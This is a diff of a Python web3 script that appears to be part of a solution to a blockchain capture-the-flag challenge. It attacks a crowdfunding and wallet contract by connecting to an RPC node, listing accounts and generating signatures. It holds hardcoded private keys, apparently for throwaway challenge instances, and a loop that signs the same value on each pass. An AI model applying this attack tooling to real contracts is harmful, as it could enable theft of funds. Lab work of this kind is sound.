@@ -3,23 +3,22 @@ from web3.gas_strategies.rpc import rpc_gas_price_strategy
 from solcx import compile_source, install_solc, compile_files
 from eth_account import Account
 from eth_account.messages import encode_defunct
-from eth_abi.packed import encode_abi_packed
 from eth_utils import keccak
 
 '''
-Private key           :  0x44134c9e9a818985a3d101beb99cecb3070e888e5b84273947f30039dce82517
-Address               :  0x166E26B2c05988bdac639658eb6D5B4310853339
-Crowdfunding contract :  0xc8e05d03890798ED7dcb0E92E4AeE6B242Bc5BC6
-Wallet contract       :  0x186F36c0F0E26f3a864cf2cd0Ae1A3B4733bA505
-Setup contract        :  0xeca564aD18ac37D349D0057b6D62e8661023A239
+Private key           :  0xa5188a9caca01432d57d683a7412ce04c3a5e3457f857b838b61e8467594d382
+Address               :  0xd2Bac494B1278aC00D0b1CfA67509C834625950B
+Crowdfunding contract :  0x9d46acC477525732942282995310f01B396A4E68
+Wallet contract       :  0x0924d5A747EBc18456b3cEE13880198D69E0a146
+Setup contract        :  0xedFE8542165fF4e9d0E59008204C0516aD547DDA
 '''
 
 x = {
-    "PrivateKey":    "0x44134c9e9a818985a3d101beb99cecb3070e888e5b84273947f30039dce82517",
-    "Address":       "0x166E26B2c05988bdac639658eb6D5B4310853339",
-    "TargetAddress": "0xc8e05d03890798ED7dcb0E92E4AeE6B242Bc5BC6",
-    "WalletAddress": "0x186F36c0F0E26f3a864cf2cd0Ae1A3B4733bA505",
-    "setupAddress":  "0xeca564aD18ac37D349D0057b6D62e8661023A239"
+    "PrivateKey":    "0xa5188a9caca01432d57d683a7412ce04c3a5e3457f857b838b61e8467594d382",
+    "Address":       "0xd2Bac494B1278aC00D0b1CfA67509C834625950B",
+    "TargetAddress": "0x9d46acC477525732942282995310f01B396A4E68",
+    "WalletAddress": "0x0924d5A747EBc18456b3cEE13880198D69E0a146",
+    "setupAddress":  "0xedFE8542165fF4e9d0E59008204C0516aD547DDA"
 }
 
 PrivateKey =    x["PrivateKey"]
@@ -29,9 +28,9 @@ SetupContract =  x["setupAddress"]
 WalletContract = x["WalletAddress"]
 
 #Attack Contract address
-Target2Contract = "0x90ba6dD1a13ec60424aE4A622DB74F2d94578c5c"
+Target2Contract = "0xcaff342A3e7D4A84595Ce48D24f00FE485DbA280"
 
-url = 'http://157.245.37.125:32675'
+url = 'http://157.245.43.189:31133'
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -42,6 +41,13 @@ balance = w3.eth.get_balance(account_address)
 print(balance)
 block = w3.eth.get_block(block_number)
 
+all_accounts = w3.eth.accounts
+
+print("All accounts in the network:")
+for account in all_accounts:
+        print(account)
+
+
 account_from = {
         'private_key': PrivateKey,
         'address': account_address,
@@ -51,10 +57,13 @@ install_solc("0.8.18")
 signatures = []
 addresses = ["0x0000000000000000000000000000000000000001","0x0000000000000000000000000000000000000002","0x0000000000000000000000000000000000000003","0x0000000000000000000000000000000000000004","0x0000000000000000000000000000000000000005","0x0000000000000000000000000000000000000006","0x0000000000000000000000000000000000000007","0x0000000000000000000000000000000000000008","0x0000000000000000000000000000000000000009"]
 
+#private_key = "0x3fa8b14e683907bfefdebe44f91d81225197136f59cba6e8bf5a8e3b9fa40569"
+private_key = PrivateKey
+
 for address in addresses:
-	data_to_sign = w3.keccak(keccak(text=address))
-	account = Account.from_key(PrivateKey)
-	signature = account.signHash(data_to_sign).signature
+	message_hash = w3.keccak(text=Address)
+	message = encode_defunct(hexstr=w3.to_hex(message_hash))
+	signature = w3.eth.account.sign_message(message, private_key=private_key).signature
 	signatures.append(signature)
 print(signatures)
 
